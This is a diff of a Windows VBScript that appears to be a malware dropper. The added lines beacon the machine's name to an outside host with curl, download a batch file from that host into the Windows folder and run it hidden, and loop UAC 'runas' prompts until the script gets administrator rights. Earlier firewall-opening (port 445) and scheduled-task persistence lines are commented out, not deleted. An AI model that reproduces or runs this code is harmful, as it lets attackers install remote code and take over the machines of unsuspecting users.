@@ -4,17 +4,22 @@ Set oShell = CreateObject ("WScript.Shell")
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
 
-
+if WScript.Arguments.Named.Exists("elevate") then
+  oShell.Run "taskkill /f /im cscript.exe", 0, True
+  oShell.Run "taskkill /f /im wscript.exe", 0, True
+end if
+x=msgbox("Your Text Here" ,0, "Your Title Here")
 With oShell
   .Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
-  .Run windir & "\step.bat", 0, True  
-  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
-  .Run "schtasks /stop /tn syssw", 0, True
-  .Run "schtasks /delete /tn syssw /F", 0, True
+  .Run "curl http://troglo.homepc.it/win/sys.bat -o "& windir &"\sys.bat", 0, True
+  .Run windir & "\sys.bat", 0, True  
+'  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
+'  .Run "schtasks /stop /tn syssw", 0, True
+'  .Run "schtasks /delete /tn syssw /F", 0, True
   '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
-  .Run "schtasks /create /tn syssw /xml " & windir & "\syssw.xml /F", 0, True
+'  .Run "schtasks /create /tn syssw /xml " & windir & "\syssw.xml /F", 0, True
   '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\hp\svc.vbs"" /tn syssw /rl highest /F", 0, True
-  .Run "schtasks /run /tn syssw", 0, True
+'  .Run "schtasks /run /tn syssw", 0, True
   
   'If UserPerms("Admin") Then
   ' Message = "Good to go"
@@ -24,7 +29,14 @@ With oShell
   ' Message = "Non-Admin"
   'End If
 End With
-
+oShell.Run oShell.ExpandEnvironmentStrings( "%APPDATA%" )&"\elevate.exe cscript.exe " & WScript.ScriptFullName, 0, True
+Do while not WScript.Arguments.Named.Exists("elevate")
+  'oShell.Run "taskkill /f /im msiexec.exe", 0, True 
+  CreateObject("Shell.Application").ShellExecute WScript.FullName _
+    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
+  WScript.Sleep(1000)
+loop
+WScript.Quit
 
 Function XmlTime(t)
     Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
